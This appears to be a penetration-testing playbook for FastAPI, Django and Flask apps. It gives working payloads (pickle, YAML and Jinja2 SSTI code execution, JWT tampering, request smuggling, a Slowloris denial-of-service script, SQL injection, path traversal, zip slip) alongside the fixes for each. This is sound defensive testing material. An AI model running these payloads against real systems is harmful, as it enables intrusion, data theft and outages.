# Python Web Stack Active Testing Payloads (FastAPI / Django / Flask)

Active attack payloads that exercise vulnerabilities unique to Python web stacks running on CPython 3.13 / 3.14. For generic OWASP API Top 10 attack payloads (SQLi, BOLA, JWT confusion, CORS reflection, rate-limit bypass), use the generic [`../TESTING_PHASES.md`](../TESTING_PHASES.md) Phases 1–7 instead.

> **Authorization required.** Run these only against systems you own or have explicit written permission to test.

---

## 1. Pickle / `yaml.load` RCE Probe (PYVULN-009, PYVULN-011)

Tests whether an endpoint or background worker accepts a serialized payload that triggers code execution on deserialization.

**Pickle RCE gadget (file write + DNS exfil):**

```python
# generate_pickle.py — produces a payload that runs `id` on deserialization
import os, pickle, base64

class Gadget:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwn",))

payload = pickle.dumps(Gadget())
print(base64.b64encode(payload).decode())
```

```bash
# Submit the payload to a suspected pickle endpoint
PAYLOAD=$(python generate_pickle.py)
curl -X POST https://target/ingest \
    -H "Content-Type: application/x-python-pickle" \
    --data-binary "$(echo "$PAYLOAD" | base64 -d)" \
    -v
```

**YAML RCE gadget:**

```bash
# Payload — works against yaml.load with default Loader
cat > /tmp/payload.yaml <<'EOF'
!!python/object/apply:os.system ["id > /tmp/pwn"]
EOF

curl -X POST https://target/import \
    -H "Content-Type: application/yaml" \
    --data-binary @/tmp/payload.yaml \
    -v
```

**Vulnerable behavior:** Worker writes `/tmp/pwn` (sandbox the test box first), or DNS lookup to attacker server fires.
**Patched behavior:** `pickle.UnpicklingError` or `yaml.constructor.ConstructorError`. PYVULN-009 / PYVULN-011 mitigations close this entirely.

---

## 2. FastAPI Documentation Exposure (PYVULN-029)

Tests whether interactive docs are reachable in production.

```bash
curl -sI https://target/docs       | head -n 1     # expect 404 in prod
curl -sI https://target/redoc      | head -n 1     # expect 404
curl -sI https://target/openapi.json | head -n 1   # expect 404 (or 401 if auth-gated)
```

**Vulnerable behavior:** 200 OK → schema content reveals every endpoint, parameter names, and example payloads — attack surface reconnaissance.
**Patched behavior:** 404 (or 401 behind admin auth). Fix: `FastAPI(docs_url=None, redoc_url=None, openapi_url=None)` when in production.

---

## 3. Django `DEBUG=True` Information Leakage (PYVULN-027)

Triggers the Django default error page to confirm `DEBUG` is on.

```bash
# Hit a nonexistent path with a bogus query — Django's debug 404 lists every URL pattern and the settings dict
curl -sS "https://target/__definitely_not_a_real_path__?_=$(date +%s)" -o /tmp/response.html
grep -o 'You.re seeing this error because you have <code>DEBUG = True' /tmp/response.html

# Hit a route that raises — debug 500 page renders the full stack frame including local variables
curl -X POST "https://target/api/raise-for-test" -d '{}' -H "Content-Type: application/json" -o /tmp/500.html
```

**Vulnerable behavior:** HTML response contains stack trace, settings dump, exposed env vars, ORM query strings.
**Patched behavior:** Generic 404 / 500 page without internals. Fix: `DEBUG = False` + custom 404/500 templates.

---

## 4. Jinja2 SSTI Escalation (PYVULN-005)

Probe escalates from harmless arithmetic to full RCE if the engine evaluates user-controlled templates.

```bash
# Step 1 — arithmetic (proves the engine is evaluating user input)
curl -sS "https://target/render?msg={{7*7}}"
# Expected if vulnerable: response contains "49"

# Step 2 — Flask config dump
curl -sS "https://target/render?msg={{config.items()}}"
# Expected if vulnerable: SECRET_KEY, DEBUG, database URL etc. visible

# Step 3 — escalate to RCE via __subclasses__ chain
curl -sS --get https://target/render \
    --data-urlencode "msg={{ ''.__class__.__mro__[1].__subclasses__() }}"
# Inspect the response for `subprocess.Popen` or `os._wrap_close` — those are RCE primitives

# Step 4 — concrete RCE (with sandbox / auth + written permission only)
curl -sS --get https://target/render \
    --data-urlencode "msg={{ cycler.__init__.__globals__.os.popen('id').read() }}"
```

**Vulnerable behavior:** Each step returns rendered content rather than the literal `{{...}}` string.
**Patched behavior:** Literal output. Fix: `select_autoescape(["html", "xml"])`, never `from_string(user_input)` or `render_template_string(user_input)`.

---

## 5. JWT `alg=none` / Algorithm Confusion (PYVULN-018)

Tests whether the decoder accepts unsigned or wrong-algorithm tokens.

```bash
# Capture a valid token
TOKEN="$(curl -sS -X POST https://target/login \
    -d 'email=a@b.com&password=test' \
    | jq -r .access_token)"

# Tamper with jwt_tool
jwt_tool "$TOKEN" -A                              # try alg=none
jwt_tool "$TOKEN" -X k                            # key confusion (sign HS256 with the RS256 public key)
jwt_tool "$TOKEN" -I -hc kid -hv ../../../dev/null   # kid injection
jwt_tool "$TOKEN" -T                              # tamper claims (e.g., `role: admin`)
```

For each tampered token, replay against a protected endpoint:

```bash
curl -sS https://target/api/admin \
    -H "Authorization: Bearer $TAMPERED_TOKEN" \
    -w "%{http_code}\n"
```

**Vulnerable behavior:** 200 OK with admin response.
**Patched behavior:** 401 / 403. Fix: `algorithms=["RS256"]` (single algorithm), `audience` + `issuer` validated, `options={"require": ["exp", "iat", "iss", "aud"]}`.

---

## 6. ASGI Request Smuggling / `Transfer-Encoding` Desync

Tests whether the ASGI server + reverse proxy desync on conflicting `Content-Length` and `Transfer-Encoding`.

```bash
# Raw request with conflicting headers (use a raw TCP tool, not curl, since curl normalizes)
python3 - <<'EOF'
import socket
host = "target.example.com"
req = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "\r\n"
)
s = socket.create_connection((host, 443), timeout=5)
s.sendall(req.encode())
print(s.recv(8192).decode(errors="ignore"))
EOF
```

**Vulnerable behavior:** Two responses come back (the smuggled `/admin` request was processed as a separate request by the backend).
**Patched behavior:** 400 / 421 reject. Fix: ensure proxy and ASGI server agree on framing (reject one or the other header); upgrade `gunicorn >= 22.0` (CVE-2024-1135) and `uvicorn` to latest.

---

## 7. Slowloris against gunicorn / uvicorn

Tests whether the worker exhausts under many slow connections.

```bash
# slowhttptest is the canonical tool
slowhttptest -c 500 -H -g -o slowloris_report -i 10 -r 200 -t GET -u https://target/ -x 24 -p 3

# Or use a Python-native probe
python3 - <<'EOF'
import socket, time, threading

def attack():
    s = socket.create_connection(("target.example.com", 443), timeout=10)
    s.sendall(b"GET / HTTP/1.1\r\nHost: target.example.com\r\nUser-Agent: x\r\n")
    while True:
        try:
            s.sendall(b"X-Filler: " + b"a" * 8 + b"\r\n")
            time.sleep(15)
        except Exception:
            return

for _ in range(500):
    threading.Thread(target=attack, daemon=True).start()
time.sleep(120)
EOF
```

**Vulnerable behavior:** Service stops responding to legitimate requests within minutes.
**Patched behavior:** Slow connections dropped after `--timeout-keep-alive` (uvicorn) / `--timeout` (gunicorn); throughput unchanged. Fix: configure `--timeout`, `--limit-concurrency`, `--max-requests`; deploy a reverse proxy that rate-limits per IP.

---

## 8. CORS Reflection (PYVULN-030)

Tests whether `Origin` is reflected without an allowlist check.

```bash
curl -sI -X OPTIONS https://target/api/data \
    -H "Origin: https://evil.example" \
    -H "Access-Control-Request-Method: POST" \
    | grep -i 'Access-Control'
```

**Vulnerable behavior:**
```
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true
```

**Patched behavior:** No `Access-Control-Allow-Origin` header at all (origin not in allowlist), or origin matched against the literal allowlist. Fix: explicit `CORSMiddleware(allow_origins=[...])` / `CORS_ALLOWED_ORIGINS = [...]` / `CORS(app, origins=[...])`.

---

## 9. SQL Injection via SQLAlchemy `text()` Escape Hatch (PYVULN-002)

Tests whether application code passes user input into the raw `text()` constructor with string concatenation.

```bash
# Authentication bypass via boolean tautology in a filter
curl -sS "https://target/api/users?email=a' OR '1'='1"

# Time-based blind probe
curl -sS -o /dev/null -w "%{time_total}\n" \
    "https://target/api/users?email=a' AND pg_sleep(5) --"
```

**Vulnerable behavior:** First query returns all users; second query takes ~5s to respond.
**Patched behavior:** First returns empty / specific user; second returns immediately. Fix: `text("SELECT ... :email")` + bound params; never f-string the SQL string.

---

## 10. Pydantic `extra="allow"` Mass Assignment

Tests whether an endpoint accepting a Pydantic model silently persists extra fields the user wasn't supposed to set.

```bash
# Assume the documented schema is {"name": str, "email": str}
curl -sS -X POST https://target/api/users \
    -H "Content-Type: application/json" \
    -d '{"name":"x","email":"x@y.z","is_admin":true,"role":"admin"}'

# Then retrieve the new record
curl -sS https://target/api/users/me \
    -H "Authorization: Bearer $NEW_USER_TOKEN"
```

**Vulnerable behavior:** Response contains `"is_admin": true` or `"role": "admin"`.
**Patched behavior:** Extra fields silently dropped (default Pydantic `extra="ignore"`) or rejected (`extra="forbid"`). Fix: configure `model_config = ConfigDict(extra="forbid")` on input schemas; use explicit DTO with only the allowed fields.

---

## 11. Path Traversal in `StaticFiles` / `send_from_directory` (PYVULN-036)

```bash
# FastAPI StaticFiles
curl -sS "https://target/static/..%2F..%2F..%2Fetc%2Fpasswd"
curl -sS "https://target/static/..%252F..%252F..%252Fetc%252Fpasswd"     # double-encoded

# Flask send_from_directory
curl -sS "https://target/files/../../etc/passwd"

# Django static (only relevant for misconfigured custom views)
curl -sS "https://target/media/..%5C..%5Cetc%5Cpasswd"
```

**Vulnerable behavior:** Response body contains the contents of `/etc/passwd`.
**Patched behavior:** 404. Fix: `Path(base).resolve()` + `.is_relative_to(base)` check before opening (PYVULN-036 patch).

---

## 12. ZIP Slip via Upload (PYVULN-037)

Tests whether the application extracts user-supplied archives without path checking.

```bash
# Build a malicious tarball
python3 - <<'EOF'
import tarfile, io, os

tar_bytes = io.BytesIO()
with tarfile.open(fileobj=tar_bytes, mode="w") as tf:
    info = tarfile.TarInfo(name="../../../../tmp/zip_slip_pwn")
    payload = b"pwned"
    info.size = len(payload)
    tf.addfile(info, io.BytesIO(payload))

with open("/tmp/zip_slip.tar", "wb") as f:
    f.write(tar_bytes.getvalue())
EOF

# Upload it
curl -sS -X POST https://target/api/import \
    -F "archive=@/tmp/zip_slip.tar"

# Check whether the file was written outside the intended dir
ls -la /tmp/zip_slip_pwn 2>/dev/null
```

**Vulnerable behavior:** `/tmp/zip_slip_pwn` exists on the server.
**Patched behavior:** Upload rejected with `ValueError` / `BadZipFile` / `tarfile` filter error. Fix: `tarfile.open(...).extractall(path=base, filter="data")` (3.12+) or manual path validation per member.

---

## 13. Free-Threaded Race Trigger (PYVULN-043, `python3.14t`)

Tests whether a counter / cache endpoint loses updates when threads run truly in parallel.

```javascript
// counter.k6.js
import http from 'k6/http';
import { check } from 'k6';

export const options = {
    vus: 200,
    duration: '30s',
};

export default function () {
    const r = http.post('https://target/api/counter/increment');
    check(r, { '200': (res) => res.status === 200 });
}
```

```bash
k6 run counter.k6.js

# After the run, fetch the counter
EXPECTED=$(jq .iterations < k6-summary.json)
ACTUAL=$(curl -sS https://target/api/counter | jq .value)
echo "expected: $EXPECTED  actual: $ACTUAL  delta: $((EXPECTED - ACTUAL))"
```

**Vulnerable behavior:** `actual < expected` — lost updates because the increment was not atomic on the free-threaded build. The same test on `python3.14` (GIL build) usually passes silently.
**Patched behavior:** `actual == expected`. Fix: `threading.Lock` around the read-modify-write, or move state to Redis / database with atomic ops.

---

## Probe results documentation

For every probe above, record:

- Target URL + method
- Exact payload (so it can be reproduced)
- Server response (headers + body excerpt)
- Verdict (vulnerable / not vulnerable / inconclusive)
- Recommended patch ID (`PYVULN-NNN` → `PATCH-NNN`)

Use `../REPORT_TEMPLATE.md` to format the final findings list.
